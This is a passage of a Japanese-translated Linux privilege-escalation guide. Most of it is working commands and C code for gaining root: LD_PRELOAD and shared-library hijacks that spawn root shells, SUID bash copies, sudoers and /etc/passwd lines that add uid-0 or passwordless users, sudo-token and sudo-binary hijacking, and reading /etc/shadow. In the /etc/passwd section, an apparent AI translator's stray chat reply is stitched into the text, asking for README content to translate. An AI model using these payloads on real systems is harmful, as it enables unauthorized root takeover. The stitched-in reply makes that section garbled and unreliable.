d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate して、マシンの位置を特定することは常に有益です。

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

常に、アクセスする前に操作できなかったマシンで動作している network services を確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

トラフィックをsniffできるか確認してください。もし可能なら、いくつかのcredentialsを入手できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が**誰**か、どの**権限**を持っているか、システムにどの**ユーザー**がいるか、どのユーザーが**ログイン**できるか、どのユーザーが**root 権限**を持っているかを確認します:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部の Linux バージョンには、**UID > INT_MAX** のユーザーが権限を昇格できるバグがありました。詳細: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
実行例: **`systemd-run -t /bin/bash`**

### グループ

root 権限を与える可能性のある**グループのメンバー**かどうかを確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深い内容がないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

環境の**パスワードを知っている場合**は、そのパスワードを使って**各ユーザーにログインを試みてください**。

### Su Brute

大量のノイズを出しても構わず、`su` と `timeout` バイナリが対象マシンに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーに対して brute-force を試みることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーの brute-force も試みます。

## Writable PATH abuses

### $PATH

もし $PATH のあるフォルダに**書き込みできる**ことが分かった場合、別のユーザー（理想的には root）が実行するコマンドと同じ名前で、かつ $PATH 上であなたの書き込み可能なフォルダより前にあるフォルダからロードされないコマンド名を使って、書き込み可能なフォルダ内に **backdoor を作成する**ことで権限昇格できる可能性があります。

### SUDO and SUID

sudo を使ってコマンドを実行できる、あるいは suid ビットが設定されているコマンドがあるかもしれません。以下で確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの**予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行を可能にします。**例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーはパスワードを知らなくても別のユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` が `root` として `vim` を実行できます。`root` ディレクトリに ssh key を追加するか、`sh` を呼び出すだけで shell を取得するのは容易です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、ユーザーが実行時に**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer** に基づいており、スクリプトを root として実行する際に任意の python ライブラリをロードするための **PYTHONPATH hijacking** に**vulnerable**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 仕組み: 非対話型シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを source します。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。sudo によって `BASH_ENV` が保持されていると、あなたのファイルは root 権限で source されます。

- 要件:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `env_keep` に `BASH_ENV` が存在すること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を優先する。
- sudo で許可されたコマンドのためのシェルラッパーを避け、最小限のバイナリを使用する。
- 保持された環境変数が使用された場合、sudo の入出力ログおよびアラートを検討する。

### Terraform を sudo 経由で HOME が保持された状態 (!env_reset)

sudo が環境をそのままにして（`!env_reset`）`terraform apply` を許可すると、`$HOME` は呼び出しユーザのままになる。したがって Terraform は root として **$HOME/.terraformrc** を読み込み、`provider_installation.dev_overrides` を尊重する。

- 必要な provider を書き込み可能なディレクトリに向け、プロバイダ名を付けた悪意あるプラグイン（例: `terraform-provider-examples`）を置く:
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root 権限で実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

Terraform の変数は `TF_VAR_<name>` 環境変数を通じて指定できます。これらは sudo が環境を保持する場合に引き継がれます。`strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` のような弱い検証は symlink を使って bypass できます:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraformはシンボリックリンクを解決して実際の`/root/root.txt`を攻撃者が読める場所へコピーします。同じ手法は、宛先のシンボリックリンクを事前に作成しておくことで、特権パスへ**書き込む**ためにも利用できます（例：プロバイダの宛先パスを`/etc/cron.d/`内に向ける）。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

`sudo -l`の出力に`env_keep+=PATH`が含まれている、または攻撃者が書き込み可能なエントリ（例：`/home/<user>/bin`）を含む`secure_path`が設定されている場合、sudoで許可されたターゲット内の相対コマンドは上書き（shadowed）され得ます。

- 必要条件: sudoルール（多くは`NOPASSWD`）で、絶対パスを使わずにコマンド（`free`, `df`, `ps`など）を呼び出すスクリプト/バイナリを実行し、かつ最初に検索される書き込み可能なPATHエントリが存在すること。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** して他のファイルを読むか、**symlinks** を使います。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている場合（\*）、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary（コマンドパスが指定されていない場合）

もし単一のコマンドに対して **sudo permission** が **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_、PATH変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（怪しい SUID バイナリの内容は常に _**strings**_ で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパスが指定されている場合）

もし**suid** バイナリが**パスを指定して別のコマンドを実行する**場合は、suid ファイルが呼び出すコマンド名と同じ名前の関数を**エクスポート**してみることができます。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成してそれをエクスポートしてみてください:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suidバイナリを呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

しかし、この機能が悪用されるのを防ぎ、システムのセキュリティを維持するために、特に **suid/sgid** 実行ファイルに関して、システムはいくつかの条件を強制します：

- ローダは、リアルユーザーID (_ruid_) がエフェクティブユーザーID (_euid_) と一致しない実行ファイルに対して **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パスにあり、かつ suid/sgid を持つライブラリのみです。

権限昇格は、`sudo` でコマンドを実行する権限があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるため、任意のコードが昇格した権限で実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
次のファイルに保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**それをコンパイル**するには:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行する
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 同様のprivescは、攻撃者が**LD_LIBRARY_PATH**環境変数を制御している場合に悪用され得る。攻撃者はライブラリが検索されるパスを制御できるためだ。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

異常に見える **SUID** 権限の付いた binary に遭遇した場合、**.so** ファイルを正しくロードしているかを確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇すると、悪用の可能性が示唆されます。

これを悪用するには、_"/path/to/.config/libcalc.c"_ のような C ファイルを作成し、次のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作し、権限昇格した shell を実行することで権限を昇格させることを目的としています。

上記の C ファイルを共有オブジェクト (.so) ファイルにコンパイルするには、次のようにします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けたSUIDバイナリを実行するとエクスプロイトが発動し、システムの侵害につながる可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binaryが、我々が書き込めるフォルダからlibraryをロードしていることがわかったので、そのフォルダに必要な名前でlibraryを作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
つまり、生成したライブラリには `a_function_name` という関数が必要になります。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を回避するために悪用できる Unix バイナリをまとめたキュレーションされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のプロジェクトで、コマンドに対して**引数のみを注入できる**場合のケースに特化しています。

このプロジェクトは、Unix バイナリの正規の機能を収集しており、それらは restricted shells からの脱出、権限昇格または昇格状態の維持、ファイル転送、bind and reverse shells の生成、その他の post-exploitation タスクの遂行に悪用できます。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使用して任意の sudo ルールを悪用する方法が見つかるか確認できます。

### Reusing Sudo Tokens

パスワードは分からないが **sudo access** を持っている場合、**sudo コマンドの実行を待ち、そのセッショントークンをハイジャックする**ことで権限を昇格できます。

権限昇格の要件:

- 既にユーザー "_sampleuser_" としてシェルを持っている
- "_sampleuser_" は **`sudo` を使用して** 過去 **15mins** に何かを実行していること（デフォルトでは、これはパスワードなしで `sudo` を使える sudo token の有効期間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0 であること
- `gdb` が利用可能であること（アップロードできる）

(一時的に `ptrace_scope` を有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`、恒久的には `/etc/sysctl.d/10-ptrace.conf` を修正して `kernel.yama.ptrace_scope = 0` を設定します)

これらの要件がすべて満たされていれば、**次を使って権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 最初の **exploit** (`exploit.sh`) はバイナリ `activate_sudo_token` を _/tmp_ に作成します。これを使ってセッション内の sudo token を **有効化** できます（自動的に root シェルにはならないので、`sudo su` を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **second exploit** (`exploit_v2.sh`) は _/tmp_ に sh shell を作成し、**root 所有で setuid が設定されます**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成し**、**sudo tokens を永続化し、全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダやフォルダ内に作成されたファイルのいずれかに対して**write permissions**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って **create a sudo token for a user and PID** することができます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、PID 1234 のそのユーザーとして shell を持っている場合、パスワードを知らなくても次のようにして **obtain sudo privileges** できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使えるか、またその方法を設定します。これらのファイルは**デフォルトで user root と group root のみが読み取り可能です**。\
**もし**このファイルを**読む**ことができれば、**興味深い情報を取得できる**可能性があり、任意のファイルに**書き込み**できるなら**escalate privileges**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD の `doas` のように、`sudo` バイナリの代替はいくつかあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし **ユーザーが通常マシンに接続して `sudo` を使用する** と分かっていて、そのユーザーコンテキストでシェルを取得している場合、**新しい sudo 実行ファイルを作成** して、まず root としてあなたのコードを実行し、その後でユーザーのコマンドを実行させることができます。次に、ユーザーコンテキストの **$PATH を変更**（例えば .bash_profile に新しいパスを追加）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使っている場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなものを実行する：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**読み込まれる設定ファイルの場所を示します**。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリが検索される他のフォルダ**を指しています。たとえば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` の場合、**システムは `/usr/local/lib` をライブラリの検索先として使用します**。

もし何らかの理由で ` /etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内で指定された設定ファイルが参照する任意のフォルダのいずれかに対して**ユーザーが書き込み権限を持っている**場合、権限昇格できる可能性があります。\

以下のページで、**この誤設定を悪用する方法**を確認してください:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数に指定されているとおり、この場所のライブラリがプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に `/var/tmp` に `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` で悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセット**を提供します。これは実質的に root の**権限をより小さく識別可能な単位に分割**することを意味します。これらの各単位は個別にプロセスに付与できるため、権限の全体セットが削減され、悪用のリスクが低下します。\
以下のページを読んで、**capabilities とその悪用方法について詳しく学んでください**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザが "**cd**" できることを意味します。\
**"read"** ビットはユーザがファイルを**一覧表示**できることを意味し、**"write"** ビットはファイルの**削除**や**作成**ができることを意味します。

## ACLs

Access Control Lists (ACLs) は任意設定の権限の第二層を表しており、従来の ugo/rwx 権限を**上書きできる**場合があります。これらの権限により、所有者やグループに属さない特定のユーザに対してアクセスを許可または拒否でき、ファイルやディレクトリへのアクセス制御をより細かく行えます。こうした**細かな制御により、より精密なアクセス管理が可能になります**。詳細は[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システムから特定のACLを持つファイルを取得する:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell sessions を開く

**古いバージョン**では、別のユーザー（**root**）の**shell session**を**hijack**できる場合があります。\
**最新バージョン**では、**自分のユーザー**の screen sessions のみに**connect**できるようになっています。しかし、**interesting information inside the session**を見つけることがあります。

### screen sessions hijacking

**screen sessions を一覧表示**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **古い tmux バージョン** による問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションを hijack することはできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチする**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
このバグはこれらのOSで新しい ssh key を作成した際に発生し、**可能なバリエーションが32,768通りしかなかった**ために起こります。つまり、全ての候補を計算でき、**ssh 公開鍵があれば対応する秘密鍵を検索できる**ということです。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private** keyでログインしようとすると、sshがあなたの鍵のpublic keyを`/home/testusername/.ssh/authorized_keys`と`/home/testusername/access`にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwardingを使うと、サーバー上に（without passphrases!）鍵を置きっぱなしにする代わりに、**use your local SSH keys instead of leaving keys**ことができます。つまり、sshで**jump**して**to a host**し、そこから別のホストへさらに**jump to another**する際に、**initial host**にある**key**を**using**してアクセスできるようになります。

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
`Host` が `*` に設定されている場合、ユーザーが別のマシンへ切り替えるたびに、そのホストがキーにアクセスできてしまう（これはセキュリティ上の問題）ことに注意してください。

ファイル `/etc/ssh_config` はこの設定を**上書き**し、この設定を許可または拒否することができます。\\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されていることを確認したら、次のページを参照してください。**悪用して権限昇格できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを起動したときに実行されるスクリプト**です。したがって、それらのいずれかに**書き込みまたは編集できる場合は権限を昇格できます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合は、**機密情報** が含まれていないか確認してください。

### Passwd/Shadow ファイル

OSによっては `/etc/passwd` と `/etc/shadow` が別名だったりバックアップが存在することがあります。そのため、**それらをすべて見つける** と **読み取れるか確認する**（ファイル内に **ハッシュがあるかどうか** を確認するため）ことを推奨します：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、**password hashes** が `/etc/passwd`（または同等のファイル）に含まれていることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
翻訳する対象の README.md の内容をこちらに貼ってください。ファイル本文を受け取ってから、指定どおりマークダウン構文を維持して日本語へ翻訳します。

また、「ユーザー `hacker` を追加して生成したパスワードを追加する」という件について確認させてください：
- README に「`hacker` と生成パスワードを追記」してよいですか（ファイル内容に書き加えますか）？
- 生成するパスワードはどの方法で作りますか（例: openssl rand -base64 12、pwgen、/dev/urandom など）？
- 生成したパスワードをプレーンテキストで表示しますか、それともハッシュ（shadow 用の暗号化）を記載しますか？

指示を確認いただければ、翻訳と同時に README への追記（`hacker` とそのパスワード）を行います。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを使って `hacker:hacker` を使用できます

または、以下の行を使用してパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD プラットフォームでは `/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` にリネームされています。

機密性の高いファイルに**書き込みができるか**を確認してください。例えば、いくつかの**サービスの設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** server を実行していて、かつ **modify the Tomcat service configuration file inside /etc/systemd/,** が可能であれば、次の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
tomcatが次に起動されると、あなたの backdoor は実行されます。

### フォルダを確認

